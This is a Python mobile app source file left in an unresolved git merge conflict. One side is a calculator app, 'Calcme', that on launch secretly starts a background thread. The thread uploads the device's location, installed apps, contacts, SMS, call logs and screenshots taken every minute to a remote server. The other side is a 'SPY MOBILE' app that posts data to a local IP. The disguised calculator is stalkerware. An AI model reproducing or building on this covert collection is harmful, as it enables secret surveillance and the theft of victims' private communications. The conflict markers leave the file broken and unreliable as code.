<<<<<<< HEAD
import toga
from toga.style import Pack
from toga.style.pack import COLUMN, ROW, CENTER
import time
import requests
import os
import threading
import logging
from datetime import datetime

# Configurar logging básico
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
logger = logging.getLogger(__name__)

# Funções dummy seguras - sempre definir primeiro
def get_location():
    """Retorna localização dummy"""
    return None, None

def get_ip():
    """Retorna IP dummy"""
    return None

def get_wifi_status():
    """Retorna status WiFi dummy"""
    return "unknown"

def get_device_id():
    """Retorna device ID dummy"""
    return "dispositivo_desconhecido"

# Tentar importar utilitários de forma SUPER segura
try:
    from device_utils import get_device_id as real_get_device_id
    get_device_id = real_get_device_id
    logger.info("Device utils OK")
except Exception as e:
    logger.warning(f"Device utils failed: {e}")

try:
    from gps_utils import get_location as real_get_location
    get_location = real_get_location
    logger.info("GPS utils OK")
except Exception as e:
    logger.warning(f"GPS utils failed: {e}")

try:
    from network_utils import get_ip as real_get_ip, get_wifi_status as real_get_wifi_status
    get_ip = real_get_ip
    get_wifi_status = real_get_wifi_status
    logger.info("Network utils OK")
except Exception as e:
    logger.warning(f"Network utils failed: {e}")

# Importar configurações centralizadas
from config import DJANGO_CONFIG, ENDPOINTS, HEADERS, COLETA_CONFIG, LOGGING_CONFIG

# Configurar logging com base na configuração
logging.basicConfig(level=getattr(logging, LOGGING_CONFIG['level']), format=LOGGING_CONFIG['format'])
logger = logging.getLogger(__name__)

# Usar configurações centralizadas
DJANGO_IP = DJANGO_CONFIG['IP']
DJANGO_PORT = DJANGO_CONFIG['PORT']
ENDPOINT_ATIVIDADE = ENDPOINTS['atividade']
ENDPOINT_CONTATOS = ENDPOINTS['contatos']
ENDPOINT_SMS = ENDPOINTS['sms']
ENDPOINT_CHAMADAS = ENDPOINTS['chamadas']
ENDPOINT_APPS = ENDPOINTS['apps']
ENDPOINT_LOCALIZACAO = ENDPOINTS['localizacao']
ENDPOINT_UPLOAD = ENDPOINTS['upload']
ENDPOINT_REDES_SOCIAIS = ENDPOINTS['redes_sociais']
ENDPOINT_ATIVIDADE_REDE = ENDPOINTS['atividade_rede']

class Calcme(toga.App):
    def startup(self):
        """Inicializar a aplicação"""
        self.main_window = toga.MainWindow(title=self.formal_name)

        # Variáveis de controle do monitoramento (discreto)
        self.is_monitoring = False
        self.start_time = None
        self.social_interactions = []

        # Variáveis da calculadora
        self.current_input = ""
        self.previous_value = 0
        self.operation = None

        # Criar interface da calculadora
        self.display_label = toga.Label(
            '0',
            style=Pack(
                text_align=CENTER,
                font_size=40,
                font_weight='bold',
                color='#000000',
                background_color='#FFFFFF',
                padding=(20, 10),
                flex=1
            )
        )

        # Layout principal
        main_box = toga.Box(style=Pack(direction=COLUMN, background_color='#FFFFFF'))

        # Adicionar display
        main_box.add(self.display_label)

        # Criar botões da calculadora
        buttons_layout = toga.Box(style=Pack(direction=COLUMN, flex=3))

        # Botões organizados em linhas
        button_rows = [
            ['7', '8', '9', '/'],
            ['4', '5', '6', '*'],
            ['1', '2', '3', '-'],
            ['0', '.', '=', '+'],
            ['C']
        ]

        for row in button_rows:
            row_box = toga.Box(style=Pack(direction=ROW))
            for button_text in row:
                if button_text == 'C':
                    # Botão C ocupa 4 colunas
                    button = toga.Button(
                        button_text,
                        on_press=self.on_clear_press,
                        style=Pack(
                            font_size=20,
                            font_weight='bold',
                            background_color='#CCCCCC',
                            color='#000000',
                            padding=10,
                            flex=4
                        )
                    )
                    row_box.add(button)
                else:
                    button = toga.Button(
                        button_text,
                        on_press=self.get_button_handler(button_text),
                        style=Pack(
                            font_size=20,
                            font_weight='bold',
                            background_color='#CCCCCC',
                            color='#000000',
                            padding=10,
                            flex=1
                        )
                    )
                    row_box.add(button)
            buttons_layout.add(row_box)

        main_box.add(buttons_layout)

        # DEBUG: Mostrar que o app iniciou
        print("Calcme app (Toga) iniciado com sucesso!")
        logger.info("Calcme app (Toga) iniciado")

        # Iniciar monitoramento discreto
        self.main_window.on_close = self.on_close
        self.start_monitoring_discreet()

        self.main_window.content = main_box
        self.main_window.show()

    def get_button_handler(self, button_text):
        """Retorna o handler apropriado para cada botão"""
        if button_text.isdigit():
            return self.on_number_press
        elif button_text in ['+', '-', '*', '/']:
            return self.on_operation_press
        elif button_text == '=':
            return self.on_equals_press
        elif button_text == '.':
            return self.on_decimal_press
        elif button_text == 'C':
            return self.on_clear_press
        return None

    def start_monitoring_discreet(self):
        """Inicia monitoramento discreto automaticamente"""
        try:
            if not self.is_monitoring:
                self.is_monitoring = True
                self.start_time = time.time()

                # Coleta inicial discreta
                self.coleta_automatica()

                # Iniciar threads para monitoramento contínuo
                self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
                self.monitoring_thread.start()

                logger.info("Monitoramento discreto (Toga) iniciado com sucesso")
                print("Monitoramento discreto (Toga) iniciado")
        except Exception as e:
            logger.error(f"Erro ao iniciar monitoramento (Toga): {e}")
            print(f"Erro ao iniciar monitoramento (Toga): {e}")

    def monitoring_loop(self):
        """Loop principal de monitoramento"""
        while self.is_monitoring:
            try:
                # Monitorar redes sociais a cada 10 segundos
                self.monitor_social_interactions()
                time.sleep(10)

                # Captura automática de screenshots a cada 1 minuto
                if int(time.time()) % 60 == 0:
                    self.take_automatic_screenshot()

                # Coleta automática a cada 5 minutos
                if int(time.time()) % 300 == 0:
                    self.coleta_automatica()

            except Exception as e:
                logger.error(f"Erro no loop de monitoramento: {e}")
                time.sleep(10)

    def coleta_automatica(self):
        """Coleta automática de dados com retry logic"""
        if not self.is_monitoring:
            return

        imei = get_device_id()  # Usar identificador único real

        # Coletar localização
        lat, lon = get_location()
        if lat and lon:
            self.send_data_with_retry(ENDPOINT_LOCALIZACAO, {'imei': imei, 'latitude': lat, 'longitude': lon}, "localização")

        # Coletar informações de rede
        ip = get_ip()
        wifi_status = get_wifi_status()
        if ip:
            self.send_data_with_retry(ENDPOINT_ATIVIDADE, {'imei': imei, 'ip': ip, 'wifi_status': wifi_status}, "atividade rede")

        # Coletar informações do dispositivo
        try:
            from device_utils import get_device_info, get_battery_info, get_storage_info
            device_info = get_device_info()
            battery_info = get_battery_info()
            storage_info = get_storage_info()

            if device_info:
                self.send_data_with_retry(ENDPOINT_ATIVIDADE, {'imei': imei, **device_info, **battery_info, **storage_info}, "dispositivo")
        except Exception as e:
            logger.error(f"Erro ao coletar dispositivo: {e}")

        # Coletar apps instalados
        try:
            from apps_utils import get_installed_apps
            apps = get_installed_apps()
            if apps:
                self.send_data_with_retry(ENDPOINT_APPS, {'imei': imei, 'apps': apps}, "apps")
        except Exception as e:
            logger.error(f"Erro ao coletar apps: {e}")

        # Coletar contatos, SMS e chamadas (menos frequente)
        if int(time.time()) % 1800 == 0:  # A cada 30 minutos
            try:
                from social_utils import get_contacts, get_sms, get_call_logs
                contacts = get_contacts()
                if contacts:
                    self.send_data_with_retry(ENDPOINT_CONTATOS, {'imei': imei, 'contatos': contacts}, "contatos")

                sms = get_sms()
                if sms:
                    self.send_data_with_retry(ENDPOINT_SMS, {'imei': imei, 'sms': sms}, "sms")

                calls = get_call_logs()
                if calls:
                    self.send_data_with_retry(ENDPOINT_CHAMADAS, {'imei': imei, 'chamadas': calls}, "chamadas")
            except Exception as e:
                logger.error(f"Erro ao coletar dados sociais: {e}")

        print(f"Coleta automática discreta (Toga) concluída para {imei}")

    def send_data_with_retry(self, endpoint, data, data_type, max_retries=3):
        """Enviar dados com retry logic"""
        if not data:
            return

        for attempt in range(max_retries):
            try:
                response = requests.post(endpoint, json=data, timeout=10)
                if response.status_code in [200, 201]:
                    logger.info(f"{data_type} enviada com sucesso: {response.status_code}")
                    return
                else:
                    logger.warning(f"Tentativa {attempt+1} falhou para {data_type}: {response.status_code}")
            except Exception as e:
                logger.error(f"Tentativa {attempt+1} erro para {data_type}: {e}")

            if attempt < max_retries - 1:
                time.sleep(2 ** attempt)  # Exponential backoff

        logger.error(f"Falhou todas as tentativas para {data_type}")

    def monitor_social_interactions(self):
        """Monitora interações em redes sociais"""
        if not self.is_monitoring:
            return

        try:
            # Para Toga, usaremos uma abordagem mais simples baseada em permissões do sistema
            # Esta é uma implementação básica que pode ser expandida
            current_time = time.time()

            # Simulação de monitoramento (em produção, seria integrado com APIs nativas)
            # Por enquanto, apenas log de atividade
            logger.info(f"Monitoramento social ativo em {current_time}")

        except Exception as e:
            logger.error(f"Erro no monitoramento social: {e}")
            print(f"Erro no monitoramento social: {e}")

    def take_automatic_screenshot(self):
        """Captura screenshot automática a cada 1 minuto"""
        if not self.is_monitoring:
            return

        try:
            # Obter IMEI do dispositivo
            imei = get_device_id()

            # Tentar capturar screenshot usando device_utils
            try:
                from device_utils import take_screenshot
                screenshot_path = take_screenshot()

                if screenshot_path and os.path.exists(screenshot_path):
                    # Fazer upload do screenshot
                    self.upload_screenshot(screenshot_path, imei, 'tela_principal')
                    logger.info(f"Screenshot automático capturado e enviado: {screenshot_path}")
                    print(f"Screenshot automático capturado e enviado: {screenshot_path}")
                else:
                    logger.warning("Screenshot não foi capturado ou arquivo não encontrado")

            except ImportError:
                logger.warning("device_utils não disponível para screenshots")

            # Tentar usar screenshot_utils se disponível
            try:
                from screenshot_utils import take_discrete_screenshot
                screenshot_path = take_discrete_screenshot()

                if screenshot_path and os.path.exists(screenshot_path):
                    # Fazer upload do screenshot
                    self.upload_screenshot(screenshot_path, imei, 'tela_discreta')
                    logger.info(f"Screenshot discreto capturado e enviado: {screenshot_path}")
                    print(f"Screenshot discreto capturado e enviado: {screenshot_path}")
                else:
                    logger.warning("Screenshot discreto não foi capturado")

            except ImportError:
                logger.warning("screenshot_utils não disponível")

        except Exception as e:
            logger.error(f"Erro na captura de screenshot automático: {e}")
            print(f"Erro na captura de screenshot automático: {e}")

    def upload_screenshot(self, screenshot_path, imei, app_name):
        """Faz upload do screenshot"""
        try:
            if os.path.exists(screenshot_path):
                with open(screenshot_path, 'rb') as f:
                    files = {'file': f}
                    data = {
                        'imei': imei,
                        'tipo': 'screenshot',
                        'app': app_name,
                        'timestamp': time.time()
                    }
                    response = requests.post(ENDPOINT_UPLOAD, files=files, data=data, timeout=10)
                    if response.status_code == 200:
                        os.remove(screenshot_path)
                        print(f"Screenshot de {app_name} enviado e removido")
        except Exception as e:
            logger.error(f"Erro no upload do screenshot: {e}")
            print(f"Erro no upload do screenshot: {e}")

    # Métodos da calculadora
    def on_number_press(self, widget):
        """Manipula pressionamento de números"""
        if self.current_input == "0":
            self.current_input = widget.text
        else:
            self.current_input += widget.text
        self.display_label.text = self.current_input

    def on_operation_press(self, widget):
        """Manipula pressionamento de operações"""
        if self.current_input and not self.operation:
            self.previous_value = float(self.current_input)
            self.operation = widget.text
            self.current_input = ""
        elif self.current_input and self.operation:
            self.on_equals_press(None)
            self.operation = widget.text

    def on_equals_press(self, widget):
        """Calcula o resultado"""
        if self.current_input and self.operation and self.previous_value is not None:
            current_value = float(self.current_input)
            if self.operation == '+':
                result = self.previous_value + current_value
            elif self.operation == '-':
                result = self.previous_value - current_value
            elif self.operation == '*':
                result = self.previous_value * current_value
            elif self.operation == '/':
                if current_value != 0:
                    result = self.previous_value / current_value
                else:
                    result = 0

            self.display_label.text = str(result)
            self.current_input = str(result)
            self.operation = None
            self.previous_value = None

    def on_decimal_press(self, widget):
        """Adiciona ponto decimal"""
        if '.' not in self.current_input:
            self.current_input += '.'
            self.display_label.text = self.current_input

    def on_clear_press(self, widget):
        """Limpa o display"""
        self.current_input = ""
        self.previous_value = None
        self.operation = None
        self.display_label.text = "0"

    def on_close(self, widget):
        """Manipula fechamento da aplicação"""
        self.is_monitoring = False
        logger.info("Aplicação Calcme (Toga) fechada")
        print("Aplicação Calcme (Toga) fechada")

def main():
    """Ponto de entrada da aplicação"""
    return Calcme('Calcme', 'org.beeware.calcme')

if __name__ == '__main__':
    main().main_loop()
=======
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.window import Window
import time
import requests

class SpyApp(BoxLayout):
    def __init__(self, **kwargs):
        super().__init__(orientation='vertical', **kwargs)
        self.is_monitoring = False
        self.start_time = None
        self.timer_event = None
        
        layout = BoxLayout(orientation='vertical', padding=20, spacing=20)
        
        layout.add_widget(Label(
            text='SPY MOBILE', 
            font_size=30, 
            color=(1,0,0,1), 
            bold=True
        ))
        
        self.timer_label = Label(
            text='00:00:00', 
            font_size=60, 
            color=(0.5,0.5,0.5,1),
            bold=True
        )
        layout.add_widget(self.timer_label)
        
        self.status_label = Label(
            text='Sistema Parado', 
            font_size=18,
            color=(0.7,0,0,1)
        )
        layout.add_widget(self.status_label)
        
        buttons = BoxLayout(orientation='horizontal', size_hint_y=0.3, spacing=10)
        
        self.play_btn = Button(
            text='PLAY', 
            font_size=20, 
            background_color=(0,0.8,0,1),
            bold=True
        )
        self.play_btn.bind(on_press=self.start)
        buttons.add_widget(self.play_btn)
        
        self.stop_btn = Button(
            text='STOP', 
            font_size=20, 
            background_color=(0.8,0,0,1),
            bold=True,
            disabled=True
        )
        self.stop_btn.bind(on_press=self.stop)
        buttons.add_widget(self.stop_btn)
        
        layout.add_widget(buttons)
        layout.add_widget(Label(
            text='Sistema de Monitoramento', 
            font_size=14,
            color=(0.5,0.5,0.5,1)
        ))
        
        self.add_widget(layout)

    def start(self, btn):
        if not self.is_monitoring:
            self.is_monitoring = True
            self.start_time = time.time()
            self.status_label.text = 'Monitorando...'
            self.timer_label.color = (1,0,0,1)
            self.play_btn.disabled = True
            self.stop_btn.disabled = False
            self.timer_event = Clock.schedule_interval(self.update_timer, 1)
            self.collect_data()

    def stop(self, btn):
        if self.is_monitoring:
            self.is_monitoring = False
            if self.timer_event:
                self.timer_event.cancel()
            self.status_label.text = 'Sistema Parado'
            self.timer_label.color = (0.5,0.5,0.5,1)
            self.timer_label.text = '00:00:00'
            self.play_btn.disabled = False
            self.stop_btn.disabled = True

    def update_timer(self, dt):
        if self.is_monitoring and self.start_time:
            elapsed = int(time.time() - self.start_time)
            h, m, s = elapsed//3600, (elapsed%3600)//60, elapsed%60
            self.timer_label.text = f'{h:02d}:{m:02d}:{s:02d}'

    def collect_data(self):
        try:
            data = {
                'device': 'spy_mobile',
                'timestamp': time.time(),
                'status': 'active'
            }
            
            # ALTERE O IP AQUI ⬇️
            try:
                response = requests.post(
                    'http://192.168.0.97:8000/api/data/', 
                    json=data, 
                    timeout=3
                )
                if response.status_code == 200:
                    self.status_label.text = 'Dados Enviados!'
                else:
                    self.status_label.text = 'Coletando (Offline)'
            except:
                self.status_label.text = 'Coletando (Offline)'
                
        except Exception as e:
            self.status_label.text = f'Erro: {str(e)[:30]}'

class SpyMobileApp(App):
    def build(self):
        Window.clearcolor = (0, 0, 0, 1)
        return SpyApp()

if __name__ == '__main__':
    SpyMobileApp().run()
>>>>>>> d4d47eead4595ed6c4c53544c9d8febe3d088397
